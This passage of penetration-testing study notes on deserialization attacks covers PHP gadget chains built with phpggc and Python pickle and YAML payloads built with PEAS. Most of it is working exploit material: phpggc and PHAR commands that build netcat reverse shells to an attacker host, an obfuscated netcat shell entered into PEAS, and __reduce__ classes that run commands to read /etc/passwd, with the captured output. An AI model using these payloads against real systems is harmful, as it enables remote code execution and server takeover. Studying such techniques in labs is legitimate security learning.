Laravel/RCE8     7.0.0 <= 8.6.9+    RCE (Function call)    __destruct    *    
Laravel/RCE9     5.4.0 <= 9.1.8+    RCE (Function call)    __destruct         

```

The `Laravel/RCE9` chain's `Type` is `RCE (Function call)`, so it needs a PHP function + arguments to call. To get a reverse shell via `system()`:

```bash
phpggc Laravel/RCE9 system 'nc -nv <ATTACKER_IP> 9999 -e /bin/bash' -b 
Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2...SNIP...Jhc2giO319
```

> Note: this payload works but produces a `500: Server Error`, since phpggc doesn't generate a valid `UserSettings` object — irrelevant if the only goal is RCE.
>

### PHAR(GGC)

A phpggc mode (originally a separate fork, since merged in) that builds a whole PHAR file instead of a bare serialized payload, letting the same gadget chains drive `file_exists`/`fopen`-style Phar deserialization:

```php
phpggc -p phar Laravel/RCE9 system 'nc -nv <ATTACKER_IP> 9999 -e /bin/bash' -o exploit.phar
```

## Tools (Python)

### JSONPickle

```python
import jsonpickle
import os

class RCE():
  def __reduce__(self):
    return os.system, ("head /etc/passwd",)

# Serialize (generate payload)
exploit = jsonpickle.encode(RCE())
print(exploit)

# Deserialize (vulnerable code)
jsonpickle.decode(exploit)
```

Further reading on `JSONPickle`/`Pickle` attacks:

- [https://davidhamann.de/2020/04/05/exploiting-python-pickle/](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)
- [https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/](https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/)

### YAML (PyYAML, ruamel.yaml)

Same `__reduce__` trick, serialized to YAML instead. `ruamel.yaml` is based on `PyYAML`, so the same technique works for both:

```python
import yaml
import subprocess

class RCE():
  def __reduce__(self):
    return subprocess.Popen(["head", "/etc/passwd"])

# Serialize (Create the payload)
exploit = yaml.dump(RCE())
print(exploit)

# Deserialize (vulnerable code)
yaml.load(exploit)
```

```bash
python3 yaml-example.py Traceback (most recent call last):
  File "/home/kali/Pen/htb/academy/work/Introduction-to-Deserialization-Attacks/3-Exploiting-Python-Deserialization/yaml-example.py", line 11, in <module>
    exploit = yaml.dump(RCE())
  File "/home/kali/.local/lib/python3.10/site-packages/yaml/__init__.py", line 290, in dump
    return dump_all([data], stream, Dumper=Dumper, **kwds)
  File "/home/kali/.local/lib/python3.10/site-packages/yaml/__init__.py", line 278, in dump_all
    dumper.represent(data)
  File "/home/kali/.local/lib/python3.10/site-packages/yaml/representer.py", line 27, in represent
    node = self.represent_data(data)
  File "/home/kali/.local/lib/python3.10/site-packages/yaml/representer.py", line 52, in represent_data
    node = self.yaml_multi_representers[data_type](self, data)
  File "/home/kali/.local/lib/python3.10/site-packages/yaml/representer.py", line 322, in represent_object
    reduce = (list(reduce)+[None]*5)[:5]
TypeError: 'Popen' object is not iterable
root:x:0:0:root:/root:/usr/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
```

The traceback is expected (a raw `Popen` object isn't representable), but the command still runs before the error — goal met. Further reading:

- [https://net-square.com/yaml-deserialization-attack-in-python.html](https://net-square.com/yaml-deserialization-attack-in-python.html)
- [https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf](https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf)

### PEAS

[PEAS](https://github.com/j0lt-github/python-deserialization-attack-payload-generator) generates Python deserialization payloads for `Pickle`, `JSONPickle`, `PyYAML` and `ruamel.yaml`:

```bash
git clone https://github.com/j0lt-github/python-deserialization-attack-payload-generator.git

cd python-deserialization-attack-payload-generator/
pip3 install -r requirements.txt 

python3 peas.py 
Enter RCE command :n''c -nv 172.17.0.1 9999 -e /bin/s''h
Enter operating system of target [linux/windows] . Default is linux :linux
Want to base64 encode payload ? [N/y] :
Enter File location and name to save :/tmp/payload                                                                                                                                           
Select Module (Pickle, PyYAML, jsonpickle, ruamel.yaml, All) :pickle
Done Saving file !!!!
```

> Some modifications are needed to make this tool work in scenarios (like this one) where `subprocess.Popen` is blocklisted.
>

## Source
Original notes:
- `_raw/Web attacks/Web Attacks/Deserialization Attacks.md`
- `_raw/Web attacks/Web Attacks/Deserialization Attacks/Introduction.md`
- `_raw/Web attacks/Web Attacks/Deserialization Attacks/Exploiting PHP Deserialization.md`
- `_raw/Web attacks/Web Attacks/Deserialization Attacks/Exploiting Python Deserialization.md`
- `_raw/Web attacks/Web Attacks/Deserialization Attacks/Defending against Deserialization Attacks.md`
- `_raw/Web attacks/Web Attacks/Deserialization Attacks/Tools of the Trade (PHP Deserialization).md`
- `_raw/Web attacks/Web Attacks/Deserialization Attacks/Tools of the Trade (Python Deserialization).md`
